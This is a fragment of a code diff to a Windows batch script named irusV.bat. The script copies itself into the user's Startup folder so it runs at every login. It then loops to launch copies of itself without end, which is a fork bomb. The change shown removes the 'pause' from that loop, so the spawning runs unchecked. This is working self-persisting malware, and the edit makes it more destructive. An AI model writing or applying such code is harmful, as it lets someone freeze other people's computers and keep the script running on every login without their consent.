@@ -32,7 +32,6 @@ if %allow% == Nein (
 set path="%~dp0\irusV.bat"
 C:\Windows\System32\xcopy.exe "%path%" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
 :vloop
-pause
 start irusV.bat
 goto vloop
 
